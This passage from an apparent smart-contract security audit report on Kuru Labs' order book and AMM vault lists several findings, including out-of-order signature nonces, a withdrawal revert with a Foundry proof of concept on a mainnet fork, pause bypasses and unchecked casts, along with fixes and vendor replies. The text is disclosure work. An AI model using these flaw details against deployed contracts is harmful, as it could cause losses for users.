Scenario:

• Consider a scenario where the user signs 3 signatures with nonces 1, 2 & 3 and expects them to be executed in the same sequence. 

• The verify function will consider all three signatures as valid. 

• Someone can submit the signature with nonce 3 first which will increment the storage nonce to 4, marking signature 1 and 2 as invalid. 

In this scenario signature 3 got executed and signature 1 & 2 got invalidated which is an unintended outcome for user. Out-of-order trade executions can cause unexpected losses to users. 

**Recommendation: **Consider enforcing sequential execution of signatures. 

- return req.nonce >= \_nonces\[req.from\] && signer == req.from; 

\+ return req.nonce == \_nonces\[req.from\] && signer == req.from; 

**Kuru Labs: **Acknowledged. Intended as feature, will not be fixing. The reason we decided to do this is because many exchange APIs allow users to use timestamp as nonce. This allows a number of things:

1. We can build a bundler that allows users to have such behaviour. 

2. Allows users to effectively cancel transactions\(like what Kurt mentions\). 

**Spearbit: **Acknowledged. 

**5.3.6**

**Large vault**

DRAFT

**withdrawals may fail due to settlement amount adjustments**

**Severity: **Medium Risk

**Context: **KuruAMMVault.sol\#L248-L298

**Description: **The issue arises from the interaction between how withdrawal amounts are calculated and how partially filled orders are handled as a consequence of the withdrawal. 

1. Swap and Partial Fill: A user trades against the vault's liquidity \(e.g., a market buy against the vault's ask\), resulting in a partial fill. This action changes the vault's asset composition, for instance, increasing its quote assets and decreasing its base assets. 

2. Withdrawal Calculation: When a liquidity provider initiates a withdrawal, the \_burnAndWithdraw function first calls \_convertToAssets to determine the user's pro-rata share \(amount1, amount2\) of the vault's current total assets. 

3. Flawed Settlement: The function then calls \_updateMarketVaultOrderSize to adjust the vault's orders in the market. If the new order size is smaller than a partially filled order, a settlement logic is triggered to account for the filled portions. 

13

The core of the problem lies here, as identified by the team:

When you move price down and then up, the vault makes some quote losses and some base gains. Since the initially calculated amounts are very close to the total reserves the vault has, the additional quote losses that the vault makes adds up as extra quote to the user. However, the vault does not have extra quote to give this user anymore. 

The final withdrawal amount \(amount1, amount2\) attempts to pull more funds from the MarginAccount than are available, causing the withdraw call to revert. 

**Proof of Concept: **Contracts patch incorporating some fixes and minor refactoring:

diff --git a/contracts/AbstractAMM.sol b/contracts/AbstractAMM.sol

index fed33a0..3a4ef27 100644

- -- a/contracts/AbstractAMM.sol

\+ \+\+ b/contracts/AbstractAMM.sol

@@ -206,7 \+206,7 @@ abstract contract AbstractAMM is IOrderBook \{

uint256 feeRebate =

\(\(\_sizeFilled \* 10 \*\* \_getBaseAssetDecimals\(\) / \_getSizePrecision\(\)\) \* \_getMakerFeeBps\(\)\)

,\! 

/ BPS\_MULTIPLIER; 

if \(feeRebate > 0\) \{

-

bytes.concat\(returnData, abi.encode\(kuruAmmVault, \_getBaseAsset\(\), feeRebate, true\)\); 

\+

returnData = bytes.concat\(returnData, abi.encode\(kuruAmmVault, \_getBaseAsset\(\), 

,\! 

feeRebate, true\)\); 

\}

\}

@@ -228,7 \+228,7 @@ abstract contract AbstractAMM is IOrderBook \{

\(\_fundsOwedToUser \* 10 \*\* \_getQuoteAssetDecimals\(\) / vaultPricePrecision\) \*

,\! 

\_getMakerFeeBps\(\)

\) / BPS\_MULTIPLIER; 

if \(feeRebate > 0\) \{

-

bytes.concat\(returnData, 

DRAFT

abi.encode\(kuruAmmVault, \_getQuoteAsset\(\), feeRebate, true\)\); 

\+

returnData = bytes.concat\(returnData, abi.encode\(kuruAmmVault, \_getQuoteAsset\(\), 

,\! 

feeRebate, true\)\); 

\}

\}

diff --git a/contracts/KuruAMMVault.sol b/contracts/KuruAMMVault.sol

index 05d259c..8db48de 100644

- -- a/contracts/KuruAMMVault.sol

\+ \+\+ b/contracts/KuruAMMVault.sol

@@ -14,15 \+14,16 @@ import \{KuruAMMVaultErrors\} from "./libraries/Errors.sol"; 

import \{IMarginAccount\} from "./interfaces/IMarginAccount.sol"; 

import \{IKuruAMMVault\} from "./interfaces/IKuruAMMVault.sol"; 

import \{IOrderBook\} from "./interfaces/IOrderBook.sol"; 

\+ import \{console2 as console\} from "lib/forge-std/src/console2.sol"; 

contract KuruAMMVault is IKuruAMMVault, ERC20, Ownable, Initializable, UUPSUpgradeable \{

using SafeTransferLib for address; 

using FixedPointMathLib for uint256; 

-

address private token1; 

\+

address private token1; // @audit-info: baseAsset

uint256 private token1Decimals; 

-

address private token2; 

\+

address private token2; // @audit-info: quoteAsset

uint256 private token2Decimals; 

IMarginAccount private marginAccount; 

14

@@ -173,7 \+174,11 @@ contract KuruAMMVault is IKuruAMMVault, ERC20, Ownable, Initializable, UUPSUpgra \_mint\(receiver, \_shares\); 

\}require\(\_shares > 0, KuruAMMVaultErrors.InsufficientLiquidityMinted\(\)\); 

-

\_updateMarketVaultOrderSize\(amount1, amount2, \_baseAmount, \_currentAskPrice, true\); 

\+

console.log\("amount1Before", amount1\); 

\+

console.log\("amount2Before", amount2\); 

\+

\(amount1, amount2\) = \_updateMarketVaultOrderSize\(amount1, amount2, \_baseAmount, 

,\! 

\_currentAskPrice, true\); 

\+

console.log\("amount1After", amount1\); 

\+

console.log\("amount2After", amount2\); 

address \_token1 = token1; 

address \_token2 = token2; 

\_depositToMarginAccount\(amount1, \_token1\); 

@@ -209,7 \+214,7 @@ contract KuruAMMVault is IKuruAMMVault, ERC20, Ownable, Initializable, UUPSUpgra uint256 \_baseAmount, 

uint256 \_currentAskPrice, 

bool isDeposit

-

\) internal \{

\+

\) internal returns \(uint256, uint256\) \{

MarketParams memory \_marketParams = marketParams; 

uint256 \_postActionBaseAmount = isDeposit ? \_baseAmount \+ amount1 : \_baseAmount - amount1; 

uint256 \_newAskPrice; 

@@ -223,7 \+228,7 @@ contract KuruAMMVault is IKuruAMMVault, ERC20, Ownable, Initializable, UUPSUpgra \_newBidPrice = FixedPointMathLib.mulDivRound\(\_newAskPrice, 1000, 1000 \+ SPREAD\_CONSTANT\); 

\(uint256 \_bestBid, uint256 \_bestAsk\) = market.bestBidAsk\(\); 

if \(

-

\(\_bestBid > \_newAskPrice && \_bestBid \!= type\(uint256\).max\) || \(\_bestAsk < 

,\! 

\_newBidPrice && \_bestAsk \!= 0\)

\+

\(\_bestBid > \_newAskPrice\) || \(\_bestAsk < \_newBidPrice\)

\) \{ revert KuruAMMVaultErrors.VaultInitializationPriceCrossesBook\(\); 

\}

@@ -299,6 \+304,7 @@ contract KuruAMMVault is DRAFT

IKuruAMMVault, ERC20, Ownable, Initializable, UUPSUpgra

market.updateVaultOrdSz\(

\_newAskSize, \_partiallyFilledAskSize, \_newBidSize, \_partiallyFilledBidSize, \_newAskPrice, 

,\! 

\_newBidPrice

\); 

\+

return \(amount1, amount2\); 

\}

/\*\*

@@ -323,12 \+329,17 @@ contract KuruAMMVault is IKuruAMMVault, ERC20, Ownable, Initializable, UUPSUpgra \(uint256 \_baseAmount, uint256 \_currentAskPrice\) = \_returnNormalizedAmountAndPrice\(false\); 

uint256 \_normalizedRemoveAmount = amount1; 

if \(totalSupply\(\) \!= 0\) \{

-

//@audit muldivdown or up? 

\+

//@auditTODO: muldivdown or up? 

\_normalizedRemoveAmount = FixedPointMathLib.mulDiv\(shares, \_baseAmount, totalSupply\(\)\); 

\}\_burn\(owner, shares\); 

-

\_updateMarketVaultOrderSize\(\_normalizedRemoveAmount, amount2, \_baseAmount, \_currentAskPrice, 

,\! 

false\); 

\+

console.log\("amount1Before", amount1\); 

\+

console.log\("normalisedRemoveAmountBefore", \_normalizedRemoveAmount\); 

\+

console.log\("amount2Before", amount2\); 

\+

\(amount1, amount2\) = \_updateMarketVaultOrderSize\(\_normalizedRemoveAmount, amount2, 

,\! 

\_baseAmount, \_currentAskPrice, false\); 

\+

console.log\("amount1After", amount1\); 

\+

console.log\("amount2After", amount2\); 

15

\_withdrawFromMarginAccount\(amount1, amount2, receiver\); 

@@ -388,7 \+399,7 @@ contract KuruAMMVault is IKuruAMMVault, ERC20, Ownable, Initializable, UUPSUpgra

\* @dev Returns normalized base asset amount without profits

\*/

function \_returnNormalizedAmountAndPrice\(bool roundUp\) internal view returns \(uint256, uint256\) \{

-

// @audit what is the right way to round this value? 

\+

// @auditTODO what is the right way to round this value? 

// ideally, should be rounded up during deposits and rounded down during withdrawals

uint96 \_normalizedAskSize = roundUp

? uint96\(FixedPointMathLib.mulDivUp\(market.vaultAskOrderSize\(\), 2000 \+ SPREAD\_CONSTANT, 

,\! 

SPREAD\_CONSTANT\)\)

diff --git a/contracts/OrderBook.sol b/contracts/OrderBook.sol

index fc1b1c2..a3370f6 100644

- -- a/contracts/OrderBook.sol

\+ \+\+ b/contracts/OrderBook.sol

@@ -79,6 \+79,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A

\}

\}

\+

// @auditS

/\*\*

\* @param \_owner The owner of the contract. 

\* @param \_baseAssetAddress Address of the first token used for trading. 

@@ -181,6 \+182,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A uint40 \_orderId = s\_orderIdCounter \+ 1; 

s\_orderIdCounter = \_orderId; 

\+

// @auditS

// Add price to the tree and update DLL of price poit. 

uint40 \_prevOrderId = OrderLinkedList.insertAtTail\(s\_buyPricePoints\[\_price\], \_orderId\); 

@@ -206,7 \+208,7 @@ contract OrderBook is

DRAFT

Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A

\{

\(, uint256 \_bestAsk\) = bestAsk\(\); 

-

if \(\(uint256\(\_price\) \* 10 \*\* 18 / pricePrecision\) >= \_bestAsk && \_bestAsk \!= 0\) \{

\+

if \(\(uint256\(\_price\) \* 10 \*\* 18 / pricePrecision\) >= \_bestAsk\) \{

if \(\_provisionOrRevert\) \{

revert OrderBookErrors.ProvisionError\(\); 

\} else \{

@@ -273,7 \+275,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A

\{

\(, uint256 \_bestBid\) = bestBid\(\); 

-

if \(\(uint256\(\_price\) \* 10 \*\* 18 / pricePrecision\) <= \_bestBid && \_bestBid \!=

,\! 

type\(uint256\).max\) \{

\+

if \(\(uint256\(\_price\) \* 10 \*\* 18 / pricePrecision\) <= \_bestBid\) \{

if \(\_provisionOrRevert\) \{

revert OrderBookErrors.ProvisionError\(\); 

\} else \{

@@ -302,11 \+304,11 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A \(, uint256 \_bestBid\) = bestBid\(\); 

\(, uint256 \_bestAsk\) = bestAsk\(\); 

require\(

-

\(\(uint256\(\_bidPrice\) \* 10 \*\* 18 / pricePrecision\) <= \_bestAsk\) || \(\_bestAsk == 0\), 

\+

\(\(uint256\(\_bidPrice\) \* 10 \*\* 18 / pricePrecision\) <= \_bestAsk\), 

OrderBookErrors.ProvisionError\(\)

\); 

require\(

-

\(\(uint256\(\_askPrice\) \* 10 \*\* 18 / pricePrecision\) >= \_bestBid\) || \(\_bestBid ==

,\! 

type\(uint256\).max\), 

16

\+

\(\(uint256\(\_askPrice\) \* 10 \*\* 18 / pricePrecision\) >= \_bestBid\), 

OrderBookErrors.ProvisionError\(\)

\); 

\}

@@ -636,6 \+638,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A

\}

\}

\+

// @auditS

/\*\*

\* @dev Places and executes a market buy order. 

\* @param \_quoteSize amount of quote asset user is ready to pay. 

@@ -783,7 \+786,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A \(bool \_isVaultFill, uint256 \_bestAsk\) = bestAsk\(\); 

\_limitPrice = \_limitPrice \* vaultPricePrecision / pricePrecision; 

-

while \(\_sizeToBeFilled > 0 && \_bestAsk <= \_limitPrice && \_bestAsk \!= 0\) \{

\+

while \(\_sizeToBeFilled > 0 && \_bestAsk <= \_limitPrice\) \{

uint96 sizeToBeFilledBefore = \_sizeToBeFilled; // Capture the size before filling

bytes memory priceUpdate; 

@@ -795,7 \+798,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A

\} else \{

\(\_sizeToBeFilled, priceUpdate\) = \_fillSizeForPrice\(

s\_sellTree, 

-

uint32\(\_bestAsk \* pricePrecision / vaultPricePrecision\), 

\+

uint32\(\_bestAsk \* pricePrecision / vaultPricePrecision\), // @auditR: potentially

,\! 

unsafe cast to uint32

s\_sellPricePoints\[\_bestAsk \* pricePrecision / vaultPricePrecision\], 

\_sizeToBeFilled

\); 

@@ -850,7 \+853,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A bytes memory makerCredits; 

\(bool \_isVaultFill, uint256

DRAFT

\_bestAsk\) = bestAsk\(\); 

-

while \(\_quoteSize > 0 && \_bestAsk \!= 0\) \{

\+

while \(\_quoteSize > 0 && \_bestAsk \!= type\(uint256\).max\) \{

bytes memory priceUpdate; 

if \(\_isVaultFill\) \{

uint96 \_sizeFilled; 

@@ -922,7 \+925,7 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, A \(bool \_isVaultFill, uint256 \_bestBid\) = bestBid\(\); 

bytes memory makerCredits; 

\_limitPrice = \_limitPrice \* vaultPricePrecision / pricePrecision; 

-

while \(\_sizeToBeFilledLeft > 0 && \_bestBid >= \_limitPrice && \_bestBid \!= type\(uint256\).max\) \{

\+

while \(\_sizeToBeFilledLeft > 0 && \_bestBid >= \_limitPrice && \_bestBid \!= 0\) \{

uint96 \_sizeToBeFilledBefore = \_sizeToBeFilledLeft; //save size left to fill

bytes memory priceUpdate; 

@@ -1256,36 \+1259,42 @@ contract OrderBook is Ownable, Initializable, UUPSUpgradeable, ERC2771Context, 

,\! 

A

return 0; 

\}

\+

// @audit-info: boolean param returned = whether the bestAsk is coming from the vault \(true\) or

,\! 

the orderbook \(false\)

function bestAsk\(\) internal view returns \(bool, uint256\) \{

uint32 firstLeft = TreeMath.findFirstLeft\(s\_sellTree, 0\); 

\+

uint256 obBestAsk = firstLeft \* vaultPricePrecision / pricePrecision; 

if \(firstLeft \!= 0\) \{

if \(vaultBestAsk \!= type\(uint256\).max\) \{

-

if \(firstLeft \* vaultPricePrecision / pricePrecision == vaultBestAsk\) \{

17

-

return \(false, firstLeft \* vaultPricePrecision / pricePrecision\); 

\+

if \(obBestAsk == vaultBestAsk\) \{

\+

return \(false, obBestAsk\); // @audit-info: we take from orderbook before taking

,\! 

from vault

\}

-

return \(FixedPointMathLib.min\(firstLeft \* vaultPricePrecision / pricePrecision, 

,\! 

vaultBestAsk\)\)

-

== vaultBestAsk ? \(true, vaultBestAsk\) : \(false, firstLeft \* vaultPricePrecision

,\! 

/ pricePrecision\); 

\+

return \(FixedPointMathLib.min\(obBestAsk, vaultBestAsk\)\) == vaultBestAsk

\+

? \(true, vaultBestAsk\)

\+

: \(false, obBestAsk\); 

\}

-

return \(false, firstLeft \* vaultPricePrecision / pricePrecision\); 

\+

return \(false, obBestAsk\); 

\}

-

return \(vaultBestAsk \!= type\(uint256\).max\) ? \(true, vaultBestAsk\) : \(false, 0\); 

\+

return \(vaultBestAsk \!= type\(uint256\).max\) ? \(true, vaultBestAsk\) : \(false, 

,\! 

type\(uint256\).max\); 

\}

function bestBid\(\) internal view returns \(bool, uint256\) \{

uint32 firstRight = TreeMath.findFirstRight\(s\_buyTree, type\(uint32\).max\); 

\+

uint256 obBestBid = firstRight \* vaultPricePrecision / pricePrecision; 

if \(firstRight \!= type\(uint32\).max\) \{

if \(vaultBestBid \!= 0\) \{

-

if \(firstRight \* vaultPricePrecision / pricePrecision == vaultBestBid\) \{

-

return \(false, firstRight \* vaultPricePrecision / pricePrecision\); 

\+

if \(obBestBid == vaultBestBid\) \{

\+

return \(false, obBestBid\); // @audit-info: we take from orderbook before taking

,\! 

from vault

\}

-

return

,\! 

-

== vaultBestBid ? \(true, DRAFT

\(FixedPointMathLib.max\(firstRight \* vaultPricePrecision / pricePrecision, 

vaultBestBid\)\)

vaultBestBid\) : \(false, firstRight \* vaultPricePrecision

,\! 

/ pricePrecision\); 

\+

return \(FixedPointMathLib.max\(obBestBid, vaultBestBid\)\)

\+

== vaultBestBid ? \(true, vaultBestBid\) : \(false, obBestBid\); 

\}

-

return \(false, firstRight \* vaultPricePrecision / pricePrecision\); 

\+

return \(false, obBestBid\); 

\}

-

return vaultBestBid \!= 0 ? \(true, vaultBestBid\) : \(false, type\(uint256\).max\); 

\+

return vaultBestBid \!= 0 ? \(true, vaultBestBid\) : \(false, 0\); 

\}

Test file:

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0; 

import \{Test, console2 as console\} from "lib/forge-std/src/Test.sol"; 

import \{OrderBook\} from "../contracts/OrderBook.sol"; 

import \{ KuruForwarder \} from "contracts/KuruForwarder.sol"; 

import \{KuruAMMVault\} from "../contracts/KuruAMMVault.sol"; 

import \{IOrderBook\} from "../contracts/interfaces/IOrderBook.sol"; 

import \{Router\} from "../contracts/Router.sol"; 

import \{MarginAccount\} from "../contracts/MarginAccount.sol"; 

import \{IERC20\} from "@openzeppelin/contracts/token/ERC20/ERC20.sol"; 

import \{ERC1967Proxy\} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol"; import \{Create2\} from "@openzeppelin/contracts/utils/Create2.sol"; 

18

contract RealWorldTest is Test \{

uint256 FORK\_BLOCK = 22673000; 

OrderBook wbtc\_usdc; 

Router router; 

MarginAccount marginAccount; 

KuruAMMVault kuruAmmVaultWbtcUsdc; 

IERC20 constant wbtc = IERC20\(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599\); 

IERC20 constant usdc = IERC20\(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\); 

address admin = makeAddr\("admin"\); 

address alice = makeAddr\("alice"\); 

address bob = makeAddr\("bob"\); 

address charlie = makeAddr\("charlie"\); 

uint256 wbtc\_amount = 100 \* 10 \*\* 8; 

uint256 usdc\_amount = 100\_000\_000 \* 10 \*\* 6; 

uint256 wbtc\_deposit = 1e8; 

uint256 usdc\_deposit = 100\_000e6; 

uint96 constant SIZE\_PRECISION = 10 \*\* 8; 

uint32 constant PRICE\_PRECISION = 1; 

uint256 constant TAKER\_FEE\_BPS = 15; 

uint256 constant MAKER\_FEE\_BPS = 8; 

uint32 constant TICK\_SIZE = 10\*\*3; 

uint96 constant MIN\_SIZE = 10 \*\* 5; // @audit-info: this is in base asset \(WBTC\)

uint96 constant MAX\_SIZE = 5 \* 10 \*\* 8; // @audit-info: this is in base asset \(WBTC\)

uint96 constant SPREAD = 100; 

KuruForwarder trustedForwarder; 

function setUp\(\) public \{

vm.rollFork\(FORK\_BLOCK\); 

vm.startPrank\(admin\); 

DRAFT

Router routerImplementation = new Router\(\); 

address routerProxy = Create2.deploy\(

0, 

bytes32\(keccak256\(""\)\), 

abi.encodePacked\(type\(ERC1967Proxy\).creationCode, abi.encode\(routerImplementation, 

,\! 

bytes\(""\)\)\)

\); 

router = Router\(payable\(routerProxy\)\); 

KuruForwarder kuruForwarderImpl = new KuruForwarder\(\); 

bytes4\[\] memory allowedInterfaces = new bytes4\[\]\(6\); 

allowedInterfaces\[0\] = OrderBook.addBuyOrder.selector; 

allowedInterfaces\[1\] = OrderBook.addSellOrder.selector; 

allowedInterfaces\[2\] = OrderBook.placeAndExecuteMarketBuy.selector; 

allowedInterfaces\[3\] = OrderBook.placeAndExecuteMarketSell.selector; 

allowedInterfaces\[4\] = MarginAccount.deposit.selector; 

allowedInterfaces\[5\] = MarginAccount.withdraw.selector; 

trustedForwarder = KuruForwarder\(\(address\(new ERC1967Proxy\(address\(kuruForwarderImpl\), ""\)\)\)\); trustedForwarder.initialize\(admin, allowedInterfaces\); 

marginAccount = new MarginAccount\(\); 

marginAccount = MarginAccount\(payable\(address\(new ERC1967Proxy\(address\(marginAccount\), ""\)\)\)\); marginAccount.initialize\(address\(this\), address\(router\), address\(router\), 

,\! 

address\(trustedForwarder\)\); 

OrderBook implementation = new OrderBook\(\); 

19

KuruAMMVault kuruAmmVaultImplementation = new KuruAMMVault\(\); 

router.initialize\(address\(this\), address\(marginAccount\), address\(implementation\), 

,\! 

address\(kuruAmmVaultImplementation\), address\(trustedForwarder\)\); 

wbtc\_usdc = OrderBook\(

router.deployProxy\(

IOrderBook.OrderBookType.NO\_NATIVE, 

address\(wbtc\), 

address\(usdc\), 

SIZE\_PRECISION, 

PRICE\_PRECISION, 

TICK\_SIZE, 

MIN\_SIZE, 

MAX\_SIZE, 

TAKER\_FEE\_BPS, 

MAKER\_FEE\_BPS, 

SPREAD

\)

\); 

kuruAmmVaultWbtcUsdc = KuruAMMVault\(payable\(router.computeVaultAddress\(address\(wbtc\_usdc\), 

,\! 

address\(0\), false\)\)\); 

vm.stopPrank\(\); 

deal\(address\(wbtc\), alice, wbtc\_amount\); 

deal\(address\(wbtc\), bob, wbtc\_amount\); 

deal\(address\(wbtc\), charlie, wbtc\_amount\); 

deal\(address\(usdc\), alice, usdc\_amount\); 

deal\(address\(usdc\), bob, usdc\_amount\); 

deal\(address\(usdc\), charlie, usdc\_amount\); 

vm.label\(address\(wbtc\), "wbtc"\); 

vm.label\(address\(usdc\), "usdc"\); 

vm.label\(address\(kuruAmmVaultWbtcUsdc\), DRAFT

"kuruAmmVaultWbtcUsdc"\); 

vm.label\(address\(router\), "router"\); 

vm.label\(address\(trustedForwarder\), "trustedForwarder"\); 

vm.label\(address\(marginAccount\), "marginAccount"\); 

vm.label\(address\(wbtc\_usdc\), "wbtc\_usdc\_orderbook"\); 

vm.startPrank\(alice\); 

wbtc.approve\(address\(marginAccount\), wbtc\_amount\); 

wbtc.approve\(address\(kuruAmmVaultWbtcUsdc\), wbtc\_amount\); 

usdc.approve\(address\(marginAccount\), usdc\_amount\); 

usdc.approve\(address\(kuruAmmVaultWbtcUsdc\), usdc\_amount\); 

marginAccount.deposit\(alice, address\(wbtc\), wbtc\_deposit\); 

marginAccount.deposit\(alice, address\(usdc\), usdc\_deposit\); 

vm.stopPrank\(\); 

\}

function test\_aliceDepositIntoVault\(\) public \{

vm.prank\(alice\); 

uint256 shares = kuruAmmVaultWbtcUsdc.deposit\(wbtc\_deposit, usdc\_deposit, alice\); 

console.log\("shares", shares\); 

\}

function test\_marketBuy\(\) public \{

test\_aliceDepositIntoVault\(\); 

\(uint256 bestBid, uint256 bestAsk\) = wbtc\_usdc.bestBidAsk\(\); 

// console.log\("bestBid", bestBid\); 

// console.log\("bestAsk", bestAsk\); 

uint96 swapSize = \_amountToSize\(10\_000e6, true\); 

20

// console.log\("Taker USDC balance before:", usdc.balanceOf\(bob\)\); 

// console.log\("Taker WBTC balance before:", wbtc.balanceOf\(bob\)\); 

uint256 ammUsdcBalanceBefore = marginAccount.getBalance\(address\(kuruAmmVaultWbtcUsdc\), 

,\! 

address\(usdc\)\); 

uint256 ammWbtcBalanceBefore = marginAccount.getBalance\(address\(kuruAmmVaultWbtcUsdc\), 

,\! 

address\(wbtc\)\); 

// console.log\("AMM USDC balance before:", ammUsdcBalanceBefore\); 

// console.log\("AMM WBTC balance before:", ammWbtcBalanceBefore\); 

vm.startPrank\(bob\); 

usdc.approve\(address\(wbtc\_usdc\), usdc\_amount\); 

uint256 tokensCredited = wbtc\_usdc.placeAndExecuteMarketBuy\(swapSize, 0, false, false\); 

// console.log\("tokensCredited", tokensCredited\); 

// console.log\("USDC balance after:", usdc.balanceOf\(bob\)\); 

// console.log\("WBTC balance after:", wbtc.balanceOf\(bob\)\); 

// console.log\("AMM USDC balance after:", 

,\! 

marginAccount.getBalance\(address\(kuruAmmVaultWbtcUsdc\), address\(usdc\)\)\); 

// console.log\("AMM WBTC balance after:", 

,\! 

marginAccount.getBalance\(address\(kuruAmmVaultWbtcUsdc\), address\(wbtc\)\)\); 

// 10\_000 USDC -> 0.09124605 WBTC

// console.log\("AMM USDC balance diff", marginAccount.getBalance\(address\(kuruAmmVaultWbtcUsdc\), 

,\! 

address\(usdc\)\) - ammUsdcBalanceBefore\); 

// console.log\("AMM WBTC balance diff", ammWbtcBalanceBefore -

,\! 

marginAccount.getBalance\(address\(kuruAmmVaultWbtcUsdc\), address\(wbtc\)\)\); 

\}

function test\_withdrawFromVaultAfterSwap\(\) public \{

test\_marketBuy\(\); 

\(,,uint96 bidPartiallyFilledSize,,uint96 askPartiallyFilledSize,,,\) =

,\! 

wbtc\_usdc.getVaultParams\(\); 

console.log\("bidPartiallyFilledSize", bidPartiallyFilledSize\); 

console.log\("askPartiallyFilledSize", askPartiallyFilledSize\); 

console.log\("vault token1 balance", marginAccount.getBalance\(address\(kuruAmmVaultWbtcUsdc\), 

,\! 

address\(wbtc\)\)\); 

console.log\("vault token2 balance", 

,\! 

DRAFT

marginAccount.getBalance\(address\(kuruAmmVaultWbtcUsdc\), 

address\(usdc\)\)\); 

vm.startPrank\(alice\); 

kuruAmmVaultWbtcUsdc.withdraw\(3162276660, alice, alice\); 

// return \(

//

kuruAmmVault, 

//

vaultBestBid, 

//

bidPartiallyFilledSize, 

//

vaultBestAsk, 

//

askPartiallyFilledSize, 

//

vaultBidOrderSize, 

//

vaultAskOrderSize, 

//

SPREAD\_CONSTANT \* 10

// \); 

\}

function \_amountToSize\(uint256 amount, bool isBuy\) internal pure returns \(uint96 size\) \{

size = isBuy ? 

uint96\(\(amount \* PRICE\_PRECISION\) / 10 \*\* 6\) :

uint96\(\(amount \* SIZE\_PRECISION\) / 10 \*\* 8\); 

\}

\}

Running the test forge test --mt test\_withdrawFromVaultAfterSwap --rpc-url mainnet -vv \(create .env file with RPC\_MAINNET \+ add \[rpc\_endpoints\] in foundry.toml or directly replace mainnet with RPC url\) yields: 21

\[FAIL: InsufficientBalance\(\)\] test\_withdrawFromVaultAfterSwap\(\) \(gas: 700449\) Logs:

amount1Before 100000000

amount2Before 100000000000

amount1After 100000000

amount2After 100000000000

shares 3162276660

bidPartiallyFilledSize 0

askPartiallyFilledSize 92667

vault token1 balance 90873567

vault token2 balance 110000000000

amount1Before 90873538

normalisedRemoveAmountBefore 90956692

amount2Before 109999965214

amount1After 90864025

amount2After 110110808612

We see that for amount2, the requested amount is 110110808612 > 110000000000. 

**Recommendation: **The team has decided to "un-fill" the partial fills. This change will be reviewed in a subsequent fix review. 

**Kuru Labs: **Fixed in commit f8ff4c73. 

**Spearbit: **Fix verified. 

**5.3.7**

**Vault operations can be performed when OrderBook is paused**

**Severity: **Medium Risk

**Context: **AbstractAMM.sol\#L252, KuruAMMVault.sol\#L18, KuruAMMVault.sol\#L141, KuruAMMVault.sol\#L307, 

OrderBook.sol\#L769

**Description: **The protocol admins have the ability to pause the OrderBook contracts. Pause feature is generally implemented to be triggered in critical scenarios like upgrades, bug diclosures, active exploits, etc. No user operation should be allowed in a paused state. However when an OrderBook is paused, users can still deposit and withdraw in KuruAMMVault which is not ideal. 

Here is the list of functions that can be called when the OrderBook is paused. 

• KuruAMMVault. 

**– **deposit. 

**– **withdraw. 

**– **mint. 

**– **redeem. 

**– **ERC20

DRAFT

functions - transfer, transferFrom, approve, permit. 

**– **Ownable functions. 

**– **receive. 

• OrderBook. 

**– **updateVaultOrdSz. 

**– **collectFees. 

**Recommendation: **Consider checking the OrderBook paused state wherever required in the above mentioned functions. Another option is to have multiple types of pauses that restrict different functionality, for use in different scenarios \(e.g. chain halt versus exploit\). 

22

**Kuru Labs: **Fixed in commit b9ce4e77. 

**Spearbit: **Fix verified. 

**5.3.8**

**Unchecked Casts Pose Significant Risk**

**Severity: **Medium Risk

**Context: **OrderBook.sol\#L863, OrderBook.sol\#L1176

**Description: **Throughout the codebase, unchecked casts are used. In most cases there is not a simple or obvious argument why they are safe. The time constraints under which this review was conducted did not allow a full investigation of all unchecked casts to either prove safety or discover an exploit. 

**Recommendation: **Default to using either checked casts or larger-width types that do not require casting except in cases where the cast can be explicitly proven to never overflow or to be non-exploitable when it does. 

**Kuru Labs: **Fixed in commit f465fd9d. Changed all unchecked casts to safe casts. 

**Spearbit: **Fix verified. 

**5.4**

**Low Risk**

**5.4.1**

**Incoming flip order prices should not be equal best available prices**

**Severity: **Low Risk

**Context: **OrderBook.sol\#L304-L310

**Description: **There is a misalignment in functionality between these lines and their equivalents in addFlipSellOrder\(\)\(L276\) and addFlipBuyOrder\(\)\(L209\). These require check, allows for \_bidPrice == \_bestAsk and \_askPrice == \_bestBid. While in the other function, the if checks forbid such equality to occur. Not allowing such equality as seen in addFlipSellOrder\(\) and addFlipBuyOrder\(\) functions is the correct logic and should be adopted in addPairedLiquidity\(\) as well. Additionally addPairedLiquidity\(\) does not have a \_provisionOrRevert return option, while

DRAFT

addFlipSellOrder\(\) and addFlipBuyOrder\(\) do, which are useful for batched

orders. 

Note: require statements are usually preferred due to better readability in general, but in this case it is preferable to adopt if to match addFlipSellOrder\(\) and addFlipBuyOrder\(\) and allow for the implementation of \_provisionOrRevert return option. 

**Recommendation:**

Replace addPairedLiquidity\(\) require statements with the same if logic seen in

addFlipSellOrder\(\) and addFlipBuyOrder\(\). 

**Kuru Labs: **Fixed in commit 4c2bf261. 

**Spearbit: **Fix verified. 

**5.4.2**

batchClaimMaxTokens\(\) **will not work for native tokens**

**Severity: **Low Risk

**Context: **MarginAccount.sol\#L176-L185

**Description: **This function does not allow native tokens to be withdrawn as it uses safeTransfer\(\) unconditionally. 

**Recommendation: **Use withdraw\(\) instead of safeTransfer\(\). 

23

function batchWithdrawMaxTokens\(address\[\] calldata \_tokens\) external \{

uint256 \_balance; 

for \(uint256 i = 0; i < \_tokens.length; i\+\+\) \{

\_balance = balances\[\_accountKey\(\_msgSender\(\), \_tokens\[i\]\)\]; 

if \(\_balance > 0\) \{

balances\[\_accountKey\(\_msgSender\(\), \_tokens\[i\]\)\] = 0; 

-

\_tokens\[i\].safeTransfer\(\_msgSender\(\), \_balance\); 

\+

withdraw\(\_balance, \_tokens\[i\]\); 

\}

\}

\}

**Kuru Labs: **Fixed in commit b87ee776. 

